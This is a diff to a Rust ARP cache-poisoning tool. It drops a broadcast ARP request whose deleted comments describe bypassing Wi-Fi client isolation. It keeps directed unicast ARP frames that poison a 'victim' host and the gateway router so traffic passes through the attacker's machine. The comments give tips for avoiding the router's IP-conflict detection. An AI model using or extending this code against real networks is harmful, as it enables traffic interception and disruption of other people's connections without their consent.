@@ -17,7 +17,7 @@ pub fn reset_target_add_count() {
 }
 
 use crate::spoofer::raw_l2::{
-    craft_arp_reply, craft_broadcast_arp_request, craft_directed_arp_request, RawL2Sender,
+    craft_arp_reply, craft_directed_arp_request, RawL2Sender,
 };
 use crate::types::{Host, HostStatus, MacAddress};
 
@@ -321,19 +321,9 @@ impl ArpSpoofer {
                         };
 
                         // 1. Poison Target Host: Gateway IP is at spoof_gw_mac.
-                        // We transmit a dual strategy to guarantee delivery across all network topologies:
-                        // A) Broadcast ARP Request: Ethernet dst = FF:FF:FF:FF:FF:FF. Wi-Fi Access Points
-                        //    are mandated to broadcast this to all associated stations, completely bypassing
-                        //    AP Client Isolation (which drops station-to-station unicast frames).
-                        // B) Directed Unicast ARP Request & Reply: Forces RFC 826 cache replacement across
-                        //    Android (arp_accept=0), iOS, and Windows on unconstrained segments.
-                        let pkt_host_bcast_req = craft_broadcast_arp_request(
-                            local_mac,
-                            gateway_ip,
-                            spoof_gw_mac,
-                            host.ip,
-                            host.mac,
-                        );
+                        // We transmit directed unicast ARP frames (eth_dst = host.mac) to ensure only the
+                        // intended victim is poisoned. We NEVER broadcast this frame (eth_dst != FF:FF:FF:FF:FF:FF)
+                        // to avoid poisoning unrelated hosts or triggering gateway router IP conflict detection.
                         let pkt_host_req = craft_directed_arp_request(
                             host.mac,
                             local_mac,
@@ -349,11 +339,11 @@ impl ArpSpoofer {
                             host.ip,
                             host.mac,
                         );
-                        let _ = s.send_frame(&pkt_host_bcast_req);
                         let _ = s.send_frame(&pkt_host_req);
                         let _ = s.send_frame(&pkt_host_reply);
 
                         // 2. Poison Gateway Router: Host IP is at spoof_host_mac.
+                        // Transmit directed unicast frames (eth_dst = gateway_mac).
                         let pkt_gw_req = craft_directed_arp_request(
                             gateway_mac,
                             local_mac,
@@ -374,7 +364,6 @@ impl ArpSpoofer {
 
                         // Dual-burst on Wi-Fi/Ethernet for small/medium target sets to prevent packet drops
                         if is_small_network {
-                            let _ = s.send_frame(&pkt_host_bcast_req);
                             let _ = s.send_frame(&pkt_host_req);
                             let _ = s.send_frame(&pkt_host_reply);
                             let _ = s.send_frame(&pkt_gw_req);
